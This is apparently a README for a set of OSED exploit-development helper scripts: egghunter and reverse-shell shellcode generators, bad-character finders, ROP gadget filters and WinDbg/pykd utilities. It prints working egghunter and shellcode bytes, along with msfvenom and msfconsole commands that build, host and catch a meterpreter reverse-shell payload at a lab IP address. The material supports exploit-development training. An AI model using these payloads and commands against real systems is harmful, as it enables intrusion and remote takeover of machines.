Useful scripts for Windows Usermode Exploit Development course (OSED).

Mostly copied from:

  - [@epi052/osed-scripts](https://github.com/epi052/osed-scripts)
  - [@sebastian93921/OSED-Code-Snippets](https://github.com/sebastian93921/OSED-Code-Snippets)
  - [@wry4n/osed-scripts](https://github.com/wry4n/osed-scripts)
  - [@nop-tech/code_caver](https://github.com/nop-tech/code_caver)

  ## Table of Contents

- [Standalone Scripts](#standalone-scripts)
    - [egghunter.py](#egghunterpy)
    - [egghunter_dep.py](#egghunter_deppy)
    - [shellcoder.py](#shellcoderpy)
    - [attach-process.ps1](#attach-processps1)
    - [find-bad-chars-sc.py](#find-bad-chars-scpy)
    - [rp++-filter.py](#rp-filterpy)
- [WinDbg Scripts](#windbg-scripts)
    - [find-ppr.py](#find-pprpy)
    - [find-bad-chars.py](#find-bad-charspy)
    - [search.py](#searchpy)
    - [find-function-iat.py](#find-function-iatpy)
    - [find-code-caves.py](#find-code-cavespy)
    - [dump-iat.py](#dump-iatpy)

## Standalone Scripts

### Installation:
pip3 install keystone-engine numpy

### egghunter.py

Requires [keystone-engine](https://github.com/keystone-engine/keystone)

```
usage: egghunter.py [-h] [-t TAG] [-b BAD_CHARS [BAD_CHARS ...]] [-s]

Creates an egghunter compatible with the OSED lab VM

optional arguments:
  -h, --help            show this help message and exit
  -t TAG, --tag TAG     tag for which the egghunter will search (default: c0d3)
  -b BAD_CHARS [BAD_CHARS ...], --bad-chars BAD_CHARS [BAD_CHARS ...]
                        space separated list of bad chars to check for in final egghunter (default: 00)
  -s, --seh             create an seh based egghunter instead of NtAccessCheckAndAuditAlarm

```                        

Generate default egghunter
```
./egghunter.py 
[+] egghunter created!
[=]   len: 35 bytes
[=]   tag: c0d3c0d3
[=]   ver: NtAccessCheckAndAuditAlarm

egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x63\x30\x64\x33\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"

```

generate egghunter with `w00tw00t` tag
```
./egghunter.py --tag w00t
[+] egghunter created!
[=]   len: 35 bytes
[=]   tag: w00tw00t
[=]   ver: NtAccessCheckAndAuditAlarm

egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"

```

generate SEH-based egghunter while checking for bad characters (does not alter the shellcode, that's to be done manually)
```
./egghunter.py -b 00 0a 25 26 3d --seh
[+] egghunter created!
[=]   len: 69 bytes
[=]   tag: c0d3c0d3
[=]   ver: SEH

egghunter = b"\xeb\x2a\x59\xb8\x63\x30\x64\x33\x51\x6a\xff\x31\xdb\x64\x89\x23\x83\xe9\x04\x83\xc3\x04\x64\x89\x0b\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xd1\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3"

```

### egghunter_dep.py

Requires [keystone-engine](ttps://github.com/keystone-engine/keystone)

Generates egghunter that can be chained with DEP bypass methods.

```
usage: egghunter_dep.py [-h] [-e EGG] [-b BAD_CHARS [BAD_CHARS ...]] [-v VAR_NAME] [--depmethod {virtualprotect,virtualalloc}]
                        [--depreg DEPREG] [--depsize DEPSIZE] [--no-color]

SEH egghunter generator with DEP support (your style)

options:
  -h, --help            show this help message and exit
  -e, --egg EGG         4-byte egg tag (default: w00t)
  -b, --bad-chars BAD_CHARS [BAD_CHARS ...]
                        Bad chars (space-separated hex, e.g., "00 0a")
  -v, --var-name VAR_NAME
                        Variable name for output (default: egghunter)
  --depmethod {virtualprotect,virtualalloc}
                        Enable DEP bypass after egg found
  --depreg DEPREG       Register holding API address (default: esi)
  --depsize DEPSIZE     Size for DEP call (default: 0x1000)
  --no-color            Disable ANSI colors
```


### shellcoder.py

Requires [keystone-engine](https://github.com/keystone-engine/keystone)

Creates reverse shell with optional msi loader

```
usage: shellcode.py [-h] [-l LHOST] [-p LPORT] [-b BAD_CHARS [BAD_CHARS ...]] [-m] [-d] [-t] [-s]

Creates shellcodes compatible with the OSED lab VM

optional arguments:
  -h, --help            show this help message and exit
  -l LHOST, --lhost LHOST
                        listening attacker system (default: 127.0.0.1)
  -p LPORT, --lport LPORT
                        listening port of the attacker system (default: 4444)
  -b BAD_CHARS [BAD_CHARS ...], --bad-chars BAD_CHARS [BAD_CHARS ...]
                        space separated list of bad chars to check for in final egghunter (default: 00)
  -m, --msi             use an msf msi exploit stager (short)
  -d, --debug-break     add a software breakpoint as the first shellcode instruction
  -t, --test-shellcode  test the shellcode on the system
  -s, --store-shellcode
                        store the shellcode in binary format in the file shellcode.bin
```

```
❯ python3 shellcode.py --msi -l 192.168.49.88 -s
[+] shellcode created! 
[=]   len:   251 bytes                                                                                            
[=]   lhost: 192.168.49.88
[=]   lport: 4444                                                                                                                                                                                                                    
[=]   break: breakpoint disabled                                                                                                                                                                                                     
[=]   ver:   MSI stager
[=]   Shellcode stored in: shellcode.bin
[=]   help:
         Create msi payload:
                 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.88 LPORT=443 -f msi -o X
         Start http server (hosting the msi file):
                 sudo python -m SimpleHTTPServer 4444 
         Start the metasploit listener:
                 sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.49.88; set LPORT 443; exploit"
         Remove bad chars with msfvenom (use --store-shellcode flag): 
                 cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f python -v shellcode

shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x72\x74\x2e\x64\x68\x6d\x73\x76\x63\x54\xff\x55\x14\x89\xc3\x68\xa7\xad\x2f\x69\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x71\x6e\x50\x68\x2f\x58\x20\x2f\x68\x34\x34\x34\x34\x68\x2e\x36\x34\x3a\x68\x38\x2e\x34\x39\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x54\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"           
****
```


### attach-process.ps1

Credit to discord user @SilverStr for the inspiration! 

One-shot script to perform the following actions:
- start a given service (if `-service-name` is provided)
- start a given executable path (if `-path` is provided)
- start windbg and attach to the given process
- run windbg commands after attaching (if `-commands` is provided)
- restart a given service when windbg exits (if `-service-name` is provided)

The values for `-service-name`, `-process-name`, and `-path` are tab-completable.

```
.\attach-process.ps1 -service-name fastbackserver -process-name fastbackserver -commands '.load pykd; bp fastbackserver!recvfrom'
```

```
\\tsclient\shared\osed-scripts\attach-process.ps1 -service-name 'Sync Breeze Enterprise' -process-name syncbrs
```

```
 \\tsclient\share\osed-scripts\attach-process.ps1 -path C:\Windows\System32\notepad.exe -process-name notepad                       
 ```

This script can be run inside a while loop for maximum laziness! Also, you can do things like `g` to start the process, followed by commands you'd like to run once the next break is hit. 

```
while ($true) {\\tsclient\shared\osed-scripts\attach-process.ps1 -process-name PROCESS_NAME -commands '.load pykd; bp SOME_ADDRESS; g; !exchain' ;}
```

Below, the process will load pykd, set a breakpoint (let's assume a pop-pop-ret gadget) and then resume execution. Once it hits the first access violation, it will run `!exchain` and then `g` to allow execution to proceed until it hits PPR gadget, after which it steps thrice using `p`, bringing EIP to the instruction directly following the pop-pop-ret. 

```
while ($true) {\\tsclient\shared\osed-scripts\attach-process.ps1 -process-name PROCESS_NAME -commands '.load pykd; bp PPR_ADDRESS; g; !exchain; g; p; p; p;' ;}
```

### find-bad-chars-sc.py

Used to quickly identify bad characters while writing custom shellcode. Uses keystone to disassebled shellcode.

Some nice features:
* Highlights bad chracters in red
* Shows machine code side to side with disassebly to locate origin of bad character in assembly
* Can simply pipe from whatever script is assembling shellcode

```
$ python3 find-bad-chars-sc.py -h    
usage: find-bad-chars-sc.py [-h] [--stdin STDIN] [-b BAD]

optional arguments:
  -h, --help         show this help message and exit
  --stdin STDIN      [*don't type option*] for piped shellcode, format: "\x00\x01" (including quotes)
  -b BAD, --bad BAD  known bad characters (ex: `-b 00,0a,0d`)
```

Example (minus color):
```
$ ./custom-sc.py | ./find-bad-chars-sc.py -b 81,ff,c9
89 e5                    mov ebp, esp
81 c4 f0 fd ff ff        add esp, 0xfffffdf0
31 c9                    xor ecx, ecx
64 8b 71 30              mov esi, dword ptr fs:[ecx + 0x30]
8b 76 0c                 mov esi, dword ptr [esi + 0xc]
8b 76 1c                 mov esi, dword ptr [esi + 0x1c]
8b 5e 08                 mov ebx, dword ptr [esi + 8]
[snip]
```

## rp++-filter.py
Used to automate the search for gadget using the output from rp++

Some nice features: 
* filters redundant gadgets (only show one of each)
* filters gadget's whose addresses have bad characters
* primarily searches first instruction (again to reduce redundancies)
* allows you to specify last instruction (for ROP, JOP, COP, etc)
* allows you to search all registers segments of a given register or a specific segment
```
usage: rp++-filter.py [-h] --skip-lines SKIP_LINES [--exact] [--op1 OP1] [--op2 OP2] [--op3 OP3] [-i INSTR]
                      [-l {1,2,3,4,5,6,7,8,9,10}] [--last-instr {all,call,ret,retn,jmp}] [-b BAD_CHARS]
                      file

A program for filtering output from rp++

positional arguments:
  file

optional arguments:
  -h, --help            show this help message and exit
  --skip-lines SKIP_LINES
                        number of lines in file before gadgets
  --exact               only return gadgets with the exact registers (e.g. exclude `ax` if `eax` specified)
  --op1 OP1             1st operand (register)
  --op2 OP2             2nd operand (register)
  --op3 OP3             3rd operand (register)
  -i INSTR, --instr INSTR
                        instruction to search for
  -l {1,2,3,4,5,6,7,8,9,10}, --length {1,2,3,4,5,6,7,8,9,10}
                        max gadget length
  --last-instr {all,call,ret,retn,jmp}
                        specify last instruction - default: ret (includes retn)
  -b BAD_CHARS, --bad-chars BAD_CHARS
                        known bad characters, format: 00,01,02,03
```

Example:
```
$ python3 rp++_filter.py rp++_output.txt --skip-lines 10 -b 00,0a --instr mov --op1 eax --op2 ecx 
0x10197333:  mov ah, ch ; adc byte [eax], dl ; add esp, 0x0C ; mulsd xmm0, xmm0 ; ret
0x1013fd80:  mov al, byte [ecx+0x08] ; ret
0x1014651d:  mov al, byte [edx+ecx+0x1B] ; mov byte [esi+0x01], al ; pop esi ; pop ebp ; ret
0x1014bc30:  mov ax, cx ; pop ebp ; ret
0x101a38cf:  mov byte [eax+eax+0x458B0000], ch ; or byte [ecx+0x40C03308], cl ; pop ebp ; ret
0x101a38a9:  mov byte [eax+eax+0x458B0000], ch ; or byte [ecx+0x5DC03308], cl ; ret
0x101a392f:  mov byte [eax-0x75000000], ch ; inc ebp ; or byte [ecx+0x40C03308], cl ; pop ebp ; ret
[snip]
```

## WinDbg Scripts

all windbg scripts require `pykd`

run `.load pykd` then `!py c:\path\to\this\repo\script.py`

Alternatively, you can put the scripts in `C:\python37\scripts` so they execute as `!py SCRIPT_NAME`. 

Also, using `attach-process.ps1` you can add `-commands '.load pykd; g'` to always have pykd available.

### find-ppr.py

Credit to @netspooky for the rewrite of this script! 

Search for `pop r32; pop r32; ret` instructions by module name. By default it only shows usable addresses without bad chars defined in the BADCHARS list on line 6.
Printed next to the gadgets is an escaped little endian address for pasting into your shellcode.

    0:000> !py find-ppr.py -b 00 0A 0D -m libspp libsync
    [+] searching libsync for pop r32; pop r32; ret
    [+] BADCHARS: \x00\x0A\x0D
    [+] libsync: Found 0 usable gadgets!
    [+] searching libspp for pop r32; pop r32; ret
    [+] BADCHARS: \x00\x0A\x0D
    [OK] libspp::0x101582b0: pop eax; pop ebx; ret ; \xB0\x82\x15\x10
    [OK] libspp::0x1001bc5a: pop ebx; pop ecx; ret ; \x5A\xBC\x01\x10
    ...
    [OK] libspp::0x10150e27: pop edi; pop esi; ret ; \x27\x0E\x15\x10
    [OK] libspp::0x10150fc8: pop edi; pop esi; ret ; \xC8\x0F\x15\x10
    [OK] libspp::0x10151820: pop edi; pop esi; ret ; \x20\x18\x15\x10
    [+] libspp: Found 316 usable gadgets!
    
    ---- STATS ----
    >> BADCHARS: \x00\x0A\x0D
    >> Usable Gadgets Found: 316
    >> Module Gadget Counts
       - libsync: 0 
       - libspp: 316 
    Done!

Show all gadgets with the `-s` flag. 

    0:000> !py find-ppr.py -b 00 0A 0D -m libspp libsync -s
    [+] searching libsync for pop r32; pop r32; ret
    [+] BADCHARS: \x00\x0A\x0D
    [--] libsync::0x0096add0: pop eax; pop ebx; ret ; \xD0\xAD\x96\x00
    [--] libsync::0x00914784: pop ebx; pop ecx; ret ; \x84\x47\x91\x00
    ...
    [OK] libspp::0x10150e27: pop edi; pop esi; ret ; \x27\x0E\x15\x10
    [OK] libspp::0x10150fc8: pop edi; pop esi; ret ; \xC8\x0F\x15\x10
    [OK] libspp::0x10151820: pop edi; pop esi; ret ; \x20\x18\x15\x10
    [+] libspp: Found 316 usable gadgets!
    
    ---- STATS ----
    >> BADCHARS: \x00\x0A\x0D
    >> Usable Gadgets Found: 316
    >> Module Gadget Counts
       - libsync: 0 
       - libspp: 316 
    Done!

### find-bad-chars.py

Performs two primary actions:
- `--generate` prints a byte string useful for inclusion in python source code
- `--address` iterates over the given memory address and compares it with the bytes generated with the given constraints

```
usage: find-bad-chars.py [-h] [-s START] [-e END] [-b BAD] (-a ADDRESS | -g)

optional arguments:
  -h, --help            show this help message and exit
  -s START, --start START
                        first byte in range to search (default: 00)
  -e END, --end END     last byte in range to search (default: ff)
  -b BAD, --bad BAD     known bad characters (ex: `-b 00,0a,0d`)
  -a ADDRESS, --address ADDRESS
                        address from which to begin character comparison
  -g, --generate        generate a byte string suitable for use in source code
```

#### --address example
```
0:008> !py find-bad-chars.py --address esp+1 --bad 1d --start 1 --end 7f
0185ff55  01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 
          01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 
0185ff65  11 12 13 14 15 16 17 18 19 1A 1B 1C 1E 1F 20 21 
          11 12 13 14 15 16 17 18 19 1A 1B 1C 1E 1F 20 21 
0185ff75  22 23 24 25 00 00 FA 00 00 00 00 94 FF 85 01 F4 
          22 23 24 25 -- -- -- -- -- -- -- -- -- -- -- -- 
0185ff85  96 92 75 00 00 00 00 D0 96 92 75 E2 19 C1 58 DC 
          -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 
0185ff95  FF 85 01 AF 4A 98 77 00 00 00 00 2B C9 03 8C 00 
          -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
...
```
#### --generate example
```
0:008> !py find-bad-chars.py --generate --bad 1d --start 1
[+] characters as a range of bytes
chars = bytes(i for i in range(1, 256) if i not in [1d])

[+] characters as a byte string
badchars  = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f'
badchars += b'\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1e\x1f'
badchars += b'\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f'
badchars += b'\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f'
badchars += b'\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f'
badchars += b'\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f'
badchars += b'\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f'
badchars += b'\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f'
badchars += b'\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f'
badchars += b'\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f'
badchars += b'\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf'
badchars += b'\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf'
badchars += b'\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf'
badchars += b'\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf'
badchars += b'\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef'
badchars += b'\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
```

### search.py

Just a wrapper around the stupid windbg search syntax.

```
usage: search.py [-h] [-t {byte,ascii,unicode}] pattern

Searches memory for the given search term

positional arguments:
  pattern               what you want to search for

optional arguments:
  -h, --help            show this help message and exit
  -t {byte,ascii,unicode}, --type {byte,ascii,unicode}
                        data type to search for (default: byte)
```
```
!py \\tsclient\shared\osed-scripts\search.py -t ascii fafd
[=] running s -a 0 L?80000000 fafd
[*] No results returned
```
```
!py \\tsclient\shared\osed-scripts\search.py -t ascii ffff
[=] running s -a 0 L?80000000 ffff
0071290e  66 66 66 66 3a 31 32 37-2e 30 2e 30 2e 31 00 00  ffff:127.0.0.1..
00717c5c  66 66 66 66 48 48 48 48-03 03 03 03 f6 f6 f6 f6  ffffHHHH........
00718ddc  66 66 66 66 28 28 28 28-d9 d9 d9 d9 24 24 24 24  ffff((((....$$$$
01763892  66 66 66 66 66 66 66 66-66 66 66 66 66 66 66 66  ffffffffffffffff
...
```

## find-function-iat.py

Uses pykd to either
1. find the IAT address of the function you want to use for your ROP DEP bypass (VA, WPM, VP) or
2. if that function is not in the IAT, locate a function that is (for example, `WriteFile`), and calculates the offset of the function you'd like from the the resolved address of that function IAT entry

A nice feature:
* you can specify the module that you'd like to use

```
usage: find-function-iat.py [-h]
                            module
                            {VirtualAllocStub,WriteProcessMemoryStub,VirtualProtectStub,LoadLibraryAStub,GetProcAddressStub}

positional arguments:
  module                address to begin search from
  {VirtualAllocStub,WriteProcessMemoryStub,VirtualProtectStub,LoadLibraryAStub,GetProcAddressStub}

optional arguments:
  -h, --help            show this help message and exit

```

Example:

```
> !py C:\Users\User\Desktop\find-function-iat.py module WriteProcessMemoryStub
[-] Using KERNEL32!RaiseExceptionStub (couldn't find WriteProcessMemoryStub IAT address)
[+] 0x1480d104 (RaiseExceptionStub IAT entry)
[+] 0x74f06ee0 (RaiseExceptionStub resolved)
[+] 0x74f22890 (WriteProcessMemoryStub resolved)
[+] 0x1b9b0 (offset = WriteProcessMemoryStub - RaiseExceptionStub)
[+] 0xfffe4650 (negative)
```


## find-code-caves.py

Disclaimer: just a copy from @nop-tech/code_caver.

Search process for code caves in e.g. library files. It will look for empty memory regions and check if the region is either protected with PAGE_EXECUTE_READ (0X20) or PAGE_EXECUTE_READWRITE (0x40).


  1. Load Pykd inside WinDbg: .load pykd
  1. !py C:\find-code-caves.py \<module\>
  1. Can also run passing address range: !py C:\find-code-caves.py \<start\> \<end\>


## dump-iat.py

Uses pykd to dump IAT from a specified module. Can filter results by desired imported modules.

```
usage: dump-iat.py [-h] module [dlls [dlls ...]]

Dump Import Address Table (IAT) of a module

positional arguments:
  module      Module name to dump IAT from
  dlls        Specific DLLs to display (optional)

optional arguments:
  -h, --help  show this help message and exit
```
